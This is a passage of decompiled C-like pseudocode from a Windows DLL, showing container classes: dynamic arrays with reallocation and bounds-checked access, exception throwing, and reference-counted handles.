      v3 = *this;
      v4 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v3 + 80))(this, 1, v4) <= 0x10 )
      {
        v15 = 16;
      }
      else
      {
        v5 = *this;
        v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
        v15 = (*(int (__thiscall **)(_DWORD *, int, int))(v5 + 80))(this, 1, v6);
      }
      v7 = (char *)this[3];
      v12 = v7;
      v8 = (12 * (unsigned __int64)(unsigned int)v15) >> 32 != 0 ? -1 : 12 * v15;
      v9 = (int *)operator new(__CFADD__(v8, 4) ? -1 : v8 + 4);
      if ( v9 )
      {
        *v9 = v15;
        v10 = (char *)(v9 + 1);
        `eh vector constructor iterator'(v9 + 1, 0xCu, v15, (void (__thiscall *)(void *))sub_100413FE, sub_1000A9D3);
        v16 = v10;
      }
      else
      {
        v16 = 0;
      }
      v14 = 0;
      if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
      {
        v11 = v16 + 8;
        Block = (char *)(v7 - v16);
        do
        {
          sub_1003F10C((_DWORD *)v11 - 2, v7);
          ++v14;
          *v11 = v11[(_DWORD)Block];
          v7 += 12;
          v11 += 12;
        }
        while ( v14 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
        v7 = v12;
      }
      this[3] = v16;
      if ( v7 )
        sub_1000AF08(v7);
      result = (void *)v15;
      this[2] = v15;
    }
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1004CC32: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *), void (__thiscall *)(void *));

//----- (1003FA98) --------------------------------------------------------
_DWORD *__stdcall sub_1003FA98(_DWORD *a1)
{
  sub_100414D5(a1);
  *a1 = &off_100952B4;
  sub_10041691(a1 + 1);
  sub_10041727(a1 + 5);
  return a1;
}
// 100952B4: using guessed type int (__thiscall *off_100952B4)(void *Block, char);

//----- (1003FAE1) --------------------------------------------------------
void *__thiscall sub_1003FAE1(_DWORD *this)
{
  *this = &off_100952B4;
  sub_1003F565(this + 5);
  sub_1003F17B((int)(this + 1));
  return sub_1003BF0F(this);
}
// 100952B4: using guessed type int (__thiscall *off_100952B4)(void *Block, char);

//----- (1003FB33) --------------------------------------------------------
bool __thiscall sub_1003FB33(_DWORD *this, _DWORD *a2)
{
  int v3; // edi

  v3 = sub_1004176B(this, a2);
  return v3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
      && *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, v3) == *a2;
}

//----- (1003FB6A) --------------------------------------------------------
char __thiscall sub_1003FB6A(_DWORD *this, _DWORD *a2)
{
  int v3; // edi

  v3 = sub_1004176B(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3) != *a2 )
  {
    return 0;
  }
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 40))(this + 1, v3);
  (*(void (__thiscall **)(_DWORD *, int))(this[5] + 40))(this + 5, v3);
  return 1;
}

//----- (1003FBB7) --------------------------------------------------------
int __thiscall sub_1003FBB7(_DWORD *this, _DWORD *a2)
{
  int v3; // esi
  int v4; // eax
  char v6[12]; // [esp+Ch] [ebp-18h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  v3 = sub_1004176B(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3) != *a2 )
  {
    (*(void (__thiscall **)(_DWORD *, _DWORD *, int))(this[1] + 32))(this + 1, a2, v3);
    v4 = sub_100099CF((int)v6, 0);
    v7 = 0;
    (*(void (__thiscall **)(_DWORD *, int, int))(this[5] + 32))(this + 5, v4, v3);
    v7 = -1;
    sub_1000A9D3(v6);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 44))(this + 5, v3);
}

//----- (1003FC37) --------------------------------------------------------
int __thiscall sub_1003FC37(_DWORD *this, _DWORD *pExceptionObject)
{
  _DWORD *v2; // esi
  int v4; // edi

  v2 = pExceptionObject;
  v4 = sub_1004176B(this, pExceptionObject);
  if ( v4 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, v4) != *v2 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 48))(this + 5, v4);
}

//----- (1003FC8C) --------------------------------------------------------
_DWORD *__thiscall sub_1003FC8C(_DWORD *this, _DWORD *a2)
{
  sub_1004163D(this + 1, a2);
  return a2;
}

//----- (1003FCC4) --------------------------------------------------------
_DWORD *__thiscall sub_1003FCC4(_DWORD *this, _DWORD *a2)
{
  sub_100416D3(this + 5, a2);
  return a2;
}

//----- (1003FCFC) --------------------------------------------------------
int __thiscall sub_1003FCFC(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 60))(this + 1, a2);
  return (*(int (__thiscall **)(_DWORD *))(this[5] + 60))(this + 5);
}

//----- (1003FD14) --------------------------------------------------------
int __thiscall sub_1003FD14(_DWORD *this)
{
  (*(void (__thiscall **)(_DWORD *))(this[1] + 52))(this + 1);
  return (*(int (__thiscall **)(_DWORD *))(this[5] + 52))(this + 5);
}

//----- (1003FD28) --------------------------------------------------------
int __thiscall sub_1003FD28(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 64))(this + 1);
}

//----- (1003FD30) --------------------------------------------------------
_DWORD *__stdcall sub_1003FD30(_DWORD *a1)
{
  unsigned int i; // esi

  sub_10041504(a1);
  *a1 = &off_100954F0;
  for ( i = 1; i < 5; i *= 2 )
    ;
  sub_100417EC(a1, i);
  return a1;
}
// 100954F0: using guessed type int (__thiscall *off_100954F0)(void *Block, char);

//----- (1003FD74) --------------------------------------------------------
int *__thiscall sub_1003FD74(int *this, int *a2)
{
  char *v3; // eax
  int v4; // ebx
  int v5; // eax
  int v6; // eax

  if ( a2 != this )
  {
    v3 = (char *)this[3];
    if ( v3 )
      sub_1000AF26(v3);
    this[2] = 1;
    v4 = *this;
    v5 = (*(int (__thiscall **)(int *))(*a2 + 4))(a2);
    v6 = (*(int (__thiscall **)(int *, int, int))(*a2 + 4))(a2, a2[3], v5);
    (*(void (__thiscall **)(int *, int))(v4 + 84))(this, v6);
  }
  return this;
}

//----- (1003FDB6) --------------------------------------------------------
void *__thiscall sub_1003FDB6(_DWORD *this)
{
  char *v2; // eax
  _DWORD v4[5]; // [esp+0h] [ebp-20h] BYREF
  int v5; // [esp+1Ch] [ebp-4h]

  v4[4] = v4;
  v4[3] = this;
  *this = &off_100954F0;
  v5 = 1;
  v2 = (char *)this[3];
  if ( v2 )
    sub_1000AF26(v2);
  this[3] = 0;
  v5 = -1;
  return sub_1003CC25(this);
}
// 100954F0: using guessed type int (__thiscall *off_100954F0)(void *Block, char);

//----- (1003FE17) --------------------------------------------------------
int __thiscall sub_1003FE17(_DWORD *this)
{
  return this[1];
}

//----- (1003FE1B) --------------------------------------------------------
_DWORD *__thiscall sub_1003FE1B(_DWORD *this, _DWORD *a2, unsigned int a3)
{
  int v4; // edi
  int v5; // eax
  unsigned int i; // ebx
  int v7; // eax
  _DWORD *result; // eax

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_100B6671);
  v4 = *this;
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 60))(this, v5 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ; --i )
  {
    v7 = this[3];
    if ( i <= a3 )
      break;
    sub_1003F10C((_DWORD *)(v7 + 8 * i), (_DWORD *)(v7 + 8 * i - 8));
  }
  result = sub_1003F10C((_DWORD *)(v7 + 8 * a3), a2);
  ++this[1];
  return result;
}

//----- (1003FE81) --------------------------------------------------------
int __thiscall sub_1003FE81(int *this, int a2)
{
  int v3; // esi
  int v4; // eax

  v3 = *this;
  v4 = (*(int (__thiscall **)(int *))(*this + 4))(this);
  return (*(int (__thiscall **)(int *, int, int))(v3 + 32))(this, a2, v4);
}

//----- (1003FE99) --------------------------------------------------------
int __thiscall sub_1003FE99(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // ebx
  int v4; // eax

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_100B6672);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    sub_1003F10C((_DWORD *)(this[3] + 8 * v2), (_DWORD *)(this[3] + 8 * v2 + 8));
    ++v2;
  }
  v4 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  sub_1003F10C((_DWORD *)(this[3] + 8 * v4), dword_100BFA44);
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}
// 100BFA44: using guessed type _DWORD dword_100BFA44[2];

//----- (1003FEF0) --------------------------------------------------------
int __thiscall sub_1003FEF0(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_100B6673);
  return this[3] + 8 * a2;
}

//----- (1003FF0E) --------------------------------------------------------
int __thiscall sub_1003FF0E(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_100B6674);
  return this[3] + 8 * a2;
}

//----- (1003FF2C) --------------------------------------------------------
char *__thiscall sub_1003FF2C(_DWORD *this, char *a2)
{
  char *result; // eax
  char *v3; // esi

  result = a2;
  if ( this[2] < (unsigned int)a2 )
  {
    v3 = (char *)this[3];
    result = (char *)(*(int (__thiscall **)(_DWORD *, _DWORD, char *, char *))(*this + 84))(this, this[1], v3, a2);
    if ( v3 )
      return sub_1000AF26(v3);
  }
  return result;
}

//----- (1003FF52) --------------------------------------------------------
int __thiscall sub_1003FF52(int *this)
{
  char *v2; // eax
  int v3; // edx
  int result; // eax

  v2 = (char *)this[3];
  if ( v2 )
    sub_1000AF26(v2);
  v3 = *this;
  this[2] = 1;
  result = (*(int (__thiscall **)(int *, _DWORD, _DWORD, int))(v3 + 84))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (1003FF79) --------------------------------------------------------
BOOL __thiscall sub_1003FF79(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this) == 0;
}

//----- (1003FF84) --------------------------------------------------------
int __thiscall sub_1003FF84(_DWORD *this, unsigned int a2)
{
  unsigned int i; // ebx
  int v4; // eax

  for ( i = a2; i < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ++i )
    sub_1003F10C((_DWORD *)(this[3] + 8 * i), dword_100BFA44);
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v4 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v4 + 88))(this);
}
// 100BFA44: using guessed type _DWORD dword_100BFA44[2];

//----- (1003FFCE) --------------------------------------------------------
unsigned int __thiscall sub_1003FFCE(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_100B6675);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 60))(a4, this[1] - a2);
  v5 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 36))(a4, this[3] + 8 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 36))(a3, this[3] + 8 * v5);
      ++v5;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v5 < result );
  }
  return result;
}

//----- (10040040) --------------------------------------------------------
unsigned int __thiscall sub_10040040(void *this, unsigned int pExceptionObject, int a3)
{
  unsigned int result; // eax

  result = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject >= result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (10040068) --------------------------------------------------------
unsigned int __stdcall sub_10040068(unsigned int a1, unsigned int a2)
{
  unsigned int result; // eax

  for ( result = a1; result < a2; result *= 2 )
    ;
  return result;
}

//----- (10040079) --------------------------------------------------------
unsigned int __thiscall sub_10040079(_DWORD *this, int a2, int a3, void *Block)
{
  int v5; // edi
  int v6; // ecx
  int *v7; // eax
  _DWORD *v8; // ebx
  int v9; // eax
  unsigned int v10; // ebx
  unsigned int result; // eax

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, void *))(*this + 80))(this, this[2], Block);
  this[2] = v5;
  v6 = (unsigned __int64)(unsigned int)v5 >> 29 != 0 ? -1 : 8 * v5;
  v7 = (int *)operator new(__CFADD__(v6, 4) ? -1 : v6 + 4);
  v8 = 0;
  if ( v7 )
  {
    v8 = v7 + 1;
    *v7 = v5;
    `eh vector constructor iterator'(v7 + 1, 8u, v5, (void (__thiscall *)(void *))sub_1004143F, sub_1000AC0D);
  }
  this[1] = a2;
  v9 = *this;
  this[3] = v8;
  v10 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(v9 + 4))(this);
  if ( result )
  {
    do
    {
      sub_1003F10C((_DWORD *)(8 * v10 + this[3]), (_DWORD *)(8 * v10 + a3));
      ++v10;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v10 < result );
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1004CC32: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *), void (__thiscall *)(void *));

//----- (10040129) --------------------------------------------------------
void *__thiscall sub_10040129(_DWORD *this)
{
  void *result; // eax
  int v3; // edi
  int v4; // eax
  int v5; // edi
  int v6; // eax
  int v7; // ecx
  int *v8; // eax
  _DWORD *v9; // edi
  _DWORD *v10; // ebx
  char *i; // eax
  char *v12; // [esp+Ch] [ebp-1Ch]
  int v13; // [esp+10h] [ebp-18h]
  _DWORD *v14; // [esp+14h] [ebp-14h]
  unsigned int v15; // [esp+18h] [ebp-10h]

  result = &loc_1007ADBE;
  if ( this[2] > 0x10u )
  {
    result = (void *)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this));
    if ( (unsigned int)result <= this[2] )
    {
      v3 = *this;
      v4 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v3 + 80))(this, 1, v4) <= 0x10 )
      {
        v13 = 16;
      }
      else
      {
        v5 = *this;
        v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
        v13 = (*(int (__thiscall **)(_DWORD *, int, int))(v5 + 80))(this, 1, v6);
      }
      v12 = (char *)this[3];
      v7 = (unsigned __int64)(unsigned int)v13 >> 29 != 0 ? -1 : 8 * v13;
      v8 = (int *)operator new(__CFADD__(v7, 4) ? -1 : v7 + 4);
      if ( v8 )
      {
        v9 = v8 + 1;
        *v8 = v13;
        `eh vector constructor iterator'(v8 + 1, 8u, v13, (void (__thiscall *)(void *))sub_1004143F, sub_1000AC0D);
        v14 = v9;
      }
      else
      {
        v14 = 0;
      }
      v15 = 0;
      if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
      {
        v10 = v14;
        for ( i = (char *)(v12 - (char *)v14); ; i = (char *)(v12 - (char *)v14) )
        {
          sub_1003F10C(v10, (_DWORD *)((char *)v10 + (_DWORD)i));
          ++v15;
          v10 += 2;
          if ( v15 >= (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
            break;
        }
      }
      this[3] = v14;
      if ( v12 )
        sub_1000AF26(v12);
      result = (void *)v13;
      this[2] = v13;
    }
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1004CC32: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *), void (__thiscall *)(void *));

//----- (1004023F) --------------------------------------------------------
_DWORD *__userpurge sub_1004023F@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10040283) --------------------------------------------------------
void __thiscall sub_10040283(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_1004186B((int)this);
}

//----- (100402BC) --------------------------------------------------------
_DWORD *__usercall sub_100402BC@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>)
{
  volatile LONG *v4; // [esp-4h] [ebp-8h]

  if ( *a1 != *a2 )
  {
    sub_1004186B((int)a1);
    a1[1] = a2[1];
    v4 = (volatile LONG *)a1[1];
    *a1 = *a2;
    InterlockedIncrement(v4);
  }
  return a1;
}

//----- (100402E4) --------------------------------------------------------
_DWORD *__usercall sub_100402E4@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<esi>)
{
  volatile LONG *v2; // ecx

  v2 = (volatile LONG *)a1[1];
  a2[1] = v2;
  *a2 = *a1;
  InterlockedIncrement(v2);
  return a2;
}

//----- (10040308) --------------------------------------------------------
_DWORD *__stdcall sub_10040308(_DWORD *a1)
{
  sub_10041543(a1);
  *a1 = &off_100955C8;
  sub_10041893(a1);
  return a1;
}
// 100955C8: using guessed type int (__thiscall *off_100955C8)(void *Block, char);

//----- (10040340) --------------------------------------------------------
int *__thiscall sub_10040340(int *this, int *a2)
{
  char *v3; // eax
  int v4; // ebx
  int v5; // eax
  int v6; // eax

  if ( a2 != this )
  {
    v3 = (char *)this[3];
    if ( v3 )
      sub_10041465(v3);
    this[2] = 1;
    v4 = *this;
    v5 = (*(int (__thiscall **)(int *))(*a2 + 4))(a2);
    v6 = (*(int (__thiscall **)(int *, int, int))(*a2 + 4))(a2, a2[3], v5);
    (*(void (__thiscall **)(int *, int))(v4 + 84))(this, v6);
  }
  return this;
}

//----- (10040382) --------------------------------------------------------
void *__thiscall sub_10040382(_DWORD *this)
{
  char *v2; // eax
  _DWORD v4[5]; // [esp+0h] [ebp-20h] BYREF
  int v5; // [esp+1Ch] [ebp-4h]

  v4[4] = v4;
  v4[3] = this;
  *this = &off_100955C8;
  v5 = 1;
  v2 = (char *)this[3];
  if ( v2 )
    sub_10041465(v2);
  this[3] = 0;
  v5 = -1;
  return sub_1003D1E3(this);
}
// 100955C8: using guessed type int (__thiscall *off_100955C8)(void *Block, char);

//----- (100403E3) --------------------------------------------------------
int __thiscall sub_100403E3(_DWORD *this)
{
  return this[1];
}

//----- (100403E7) --------------------------------------------------------
_DWORD *__thiscall sub_100403E7(_DWORD *this, _DWORD *a2, unsigned int a3)
{
  int v4; // edi
  int v5; // eax
  unsigned int i; // ebx
  int v7; // eax
  _DWORD *result; // eax

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_100B6676);
  v4 = *this;
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 60))(this, v5 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ; --i )
  {
    v7 = this[3];
    if ( i <= a3 )
      break;
    sub_100402BC((_DWORD *)(v7 + 8 * i), (_DWORD *)(v7 + 8 * i - 8));
  }
  result = sub_100402BC((_DWORD *)(v7 + 8 * a3), a2);
  ++this[1];
  return result;
}

//----- (1004044D) --------------------------------------------------------
int __thiscall sub_1004044D(int *this, int a2)
{
  int v3; // esi
  int v4; // eax

  v3 = *this;
  v4 = (*(int (__thiscall **)(int *))(*this + 4))(this);
  return (*(int (__thiscall **)(int *, int, int))(v3 + 32))(this, a2, v4);
}

//----- (10040465) --------------------------------------------------------
int __thiscall sub_10040465(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // ebx
  int v4; // eax

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_100B6677);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    sub_100402BC((_DWORD *)(this[3] + 8 * v2), (_DWORD *)(this[3] + 8 * v2 + 8));
    ++v2;
  }
  v4 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  sub_100402BC((_DWORD *)(this[3] + 8 * v4), dword_100BFAA0);
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}
// 100BFAA0: using guessed type _DWORD dword_100BFAA0[2];

//----- (100404BC) --------------------------------------------------------
int __thiscall sub_100404BC(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_100B6678);
  return this[3] + 8 * a2;
}

//----- (100404DA) --------------------------------------------------------
int __thiscall sub_100404DA(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_100B6679);
  return this[3] + 8 * a2;
}

//----- (100404F8) --------------------------------------------------------
char *__thiscall sub_100404F8(_DWORD *this, char *a2)
{
  char *result; // eax
  char *v3; // esi

  result = a2;
  if ( this[2] < (unsigned int)a2 )
  {
    v3 = (char *)this[3];
    result = (char *)(*(int (__thiscall **)(_DWORD *, _DWORD, char *, char *))(*this + 84))(this, this[1], v3, a2);
    if ( v3 )
      return sub_10041465(v3);
  }
  return result;
}

//----- (1004051E) --------------------------------------------------------
int __thiscall sub_1004051E(int *this)
{
  char *v2; // eax
  int v3; // edx
  int result; // eax

  v2 = (char *)this[3];
  if ( v2 )
    sub_10041465(v2);
  v3 = *this;
  this[2] = 1;
  result = (*(int (__thiscall **)(int *, _DWORD, _DWORD, int))(v3 + 84))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (10040545) --------------------------------------------------------
BOOL __thiscall sub_10040545(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this) == 0;
}

//----- (10040550) --------------------------------------------------------
int __thiscall sub_10040550(_DWORD *this, unsigned int a2)
{
  unsigned int i; // ebx
  int v4; // eax

  for ( i = a2; i < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ++i )
    sub_100402BC((_DWORD *)(this[3] + 8 * i), dword_100BFAA0);
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v4 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v4 + 88))(this);
}
// 100BFAA0: using guessed type _DWORD dword_100BFAA0[2];

//----- (1004059A) --------------------------------------------------------
unsigned int __thiscall sub_1004059A(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_100B667A);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 60))(a4, this[1] - a2);
  v5 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 36))(a4, this[3] + 8 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 36))(a3, this[3] + 8 * v5);
      ++v5;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v5 < result );
  }
  return result;
}

//----- (1004060C) --------------------------------------------------------
unsigned int __thiscall sub_1004060C(void *this, unsigned int pExceptionObject, int a3)
{
  unsigned int result; // eax

  result = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject >= result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (10040634) --------------------------------------------------------
unsigned int __stdcall sub_10040634(unsigned int a1, unsigned int a2)
{
  unsigned int result; // eax

  for ( result = a1; result < a2; result *= 2 )
    ;
  return result;
}

//----- (10040645) --------------------------------------------------------
unsigned int __thiscall sub_10040645(_DWORD *this, int a2, int a3, void *Block)
{
  int v5; // edi
  int v6; // ecx
  int *v7; // eax
  _DWORD *v8; // ebx
  int v9; // eax
  unsigned int v10; // ebx
  unsigned int result; // eax

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, void *))(*this + 80))(this, this[2], Block);
  this[2] = v5;
  v6 = (unsigned __int64)(unsigned int)v5 >> 29 != 0 ? -1 : 8 * v5;
  v7 = (int *)operator new(__CFADD__(v6, 4) ? -1 : v6 + 4);
  v8 = 0;
  if ( v7 )
  {
    v8 = v7 + 1;
    *v7 = v5;
    `eh vector constructor iterator'(v7 + 1, 8u, v5, (void (__thiscall *)(void *))sub_10041483, sub_10040283);
  }
  this[1] = a2;
  v9 = *this;
  this[3] = v8;
  v10 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(v9 + 4))(this);
  if ( result )
  {
    do
    {
      sub_100402BC((_DWORD *)(8 * v10 + this[3]), (_DWORD *)(8 * v10 + a3));
      ++v10;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v10 < result );
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1004CC32: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *), void (__thiscall *)(void *));

//----- (100406F5) --------------------------------------------------------
void *__thiscall sub_100406F5(_DWORD *this)
{
  void *result; // eax
  int v3; // edi
  int v4; // eax
  int v5; // edi
  int v6; // eax
  int v7; // ecx
  int *v8; // eax
  _DWORD *v9; // edi
  _DWORD *v10; // ebx
  char *i; // eax
  char *v12; // [esp+Ch] [ebp-1Ch]
  int v13; // [esp+10h] [ebp-18h]
  _DWORD *v14; // [esp+14h] [ebp-14h]
  unsigned int v15; // [esp+18h] [ebp-10h]

  result = &loc_1007933F;
  if ( this[2] > 0x10u )
  {
    result = (void *)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this));
    if ( (unsigned int)result <= this[2] )
    {
      v3 = *this;
      v4 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v3 + 80))(this, 1, v4) <= 0x10 )
      {
        v13 = 16;
      }
      else
      {
        v5 = *this;
        v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
        v13 = (*(int (__thiscall **)(_DWORD *, int, int))(v5 + 80))(this, 1, v6);
      }
      v12 = (char *)this[3];
      v7 = (unsigned __int64)(unsigned int)v13 >> 29 != 0 ? -1 : 8 * v13;
      v8 = (int *)operator new(__CFADD__(v7, 4) ? -1 : v7 + 4);
      if ( v8 )
      {
        v9 = v8 + 1;
        *v8 = v13;
        `eh vector constructor iterator'(v8 + 1, 8u, v13, (void (__thiscall *)(void *))sub_10041483, sub_10040283);
        v14 = v9;
      }
      else
      {
        v14 = 0;
      }
      v15 = 0;
      if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
      {
        v10 = v14;
        for ( i = (char *)(v12 - (char *)v14); ; i = (char *)(v12 - (char *)v14) )
        {
          sub_100402BC(v10, (_DWORD *)((char *)v10 + (_DWORD)i));
          ++v15;
          v10 += 2;
          if ( v15 >= (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
            break;
        }
      }
      this[3] = v14;
      if ( v12 )
        sub_10041465(v12);
      result = (void *)v13;
      this[2] = v13;
    }
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1004CC32: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *), void (__thiscall *)(void *));

//----- (1004080B) --------------------------------------------------------
_DWORD *__usercall sub_1004080B@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<esi>)
{
  volatile LONG *v2; // ecx

  v2 = (volatile LONG *)a1[1];
  a2[1] = v2;
  *a2 = *a1;
  InterlockedIncrement(v2);
  return a2;
}

//----- (1004081F) --------------------------------------------------------
void __thiscall sub_1004081F(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10041980((int)this);
}

//----- (1004085B) --------------------------------------------------------
_DWORD *__stdcall sub_1004085B(_DWORD *a1)
{
  sub_10041572(a1);
  *a1 = &off_10095258;
  sub_100419A8(a1, 0x10u);
  return a1;
}
// 10095258: using guessed type int (__thiscall *off_10095258)(void *Block, char);

//----- (10040898) --------------------------------------------------------
